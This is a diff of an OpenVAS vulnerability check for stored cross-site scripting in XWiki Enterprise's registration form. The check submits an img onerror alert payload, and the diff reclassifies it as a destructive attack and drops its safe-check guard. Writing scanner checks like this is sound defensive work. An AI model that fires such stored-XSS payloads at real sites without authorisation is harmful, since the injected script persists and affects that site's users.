@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_xwiki_enterprise_mult_stored_xss_vuln.nasl 11374 2018-09-13 12:45:05Z asteins $
+# $Id: gb_xwiki_enterprise_mult_stored_xss_vuln.nasl 11430 2018-09-17 10:16:03Z cfischer $
 #
 # XWiki Enterprise Multiple Stored Cross-Site Scripting Vulnerabilities
 #
@@ -29,11 +29,11 @@ CPE = "cpe:/a:xwiki:xwiki";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.802671");
-  script_version("$Revision: 11374 $");
+  script_version("$Revision: 11430 $");
   script_bugtraq_id(55235);
   script_tag(name:"cvss_base", value:"4.3");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-13 14:45:05 +0200 (Thu, 13 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-17 12:16:03 +0200 (Mon, 17 Sep 2018) $");
   script_tag(name:"creation_date", value:"2012-08-30 19:24:16 +0530 (Thu, 30 Aug 2012)");
   script_name("XWiki Enterprise Multiple Stored Cross-Site Scripting Vulnerabilities");
   script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/78026");
@@ -41,7 +41,7 @@ if(description)
   script_xref(name:"URL", value:"http://packetstormsecurity.org/files/115939/XWiki-4.2-milestone-2-Cross-Site-Scripting.html");
 
   script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
-  script_category(ACT_ATTACK);
+  script_category(ACT_DESTRUCTIVE_ATTACK); # Stored XSS
   script_tag(name:"qod_type", value:"remote_vul");
   script_family("Web application abuses");
   script_dependencies("gb_xwiki_enterprise_detect.nasl");
@@ -77,11 +77,6 @@ include("host_details.inc");
 
 xss  = "<img src='1.jpg'onerror=javascript:alert(0)>";
 
-## Stored XSS (Not a safe check)
-if(safe_checks()){
-  exit(0);
-}
-
 if(!xwikiPort = get_app_port(cpe:CPE)){
   exit(0);
 }
@@ -90,11 +85,11 @@ if(!dir = get_dir_from_kb(port:xwikiPort, app:"XWiki")){
   exit(0);
 }
 
+useragent = get_http_user_agent();
 host = http_host_name(port:xwikiPort);
 
 url = dir + "/bin/register/XWiki/Register";
 
-## Send Register request and Receive the response
 sndReq = http_get(item:url, port:xwikiPort);
 rcvRes = http_keepalive_send_recv(port:xwikiPort, data:sndReq);
 
@@ -118,13 +113,11 @@ postdata = "form_token="+ tokenValue[1] +
 
 req = string("POST ", url, " HTTP/1.1\r\n",
              "Host: ", host, "\r\n",
-             "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
+             "User-Agent: ", useragent, "\r\n",
              "Referer: http://", host, url, "\r\n",
              "Content-Type: application/x-www-form-urlencoded\r\n",
              "Content-Length: ", strlen(postdata), "\r\n",
              "\r\n", postdata);
-
-## Send XSS attack
 res = http_keepalive_send_recv(port:xwikiPort, data:req);
 
 if (res)
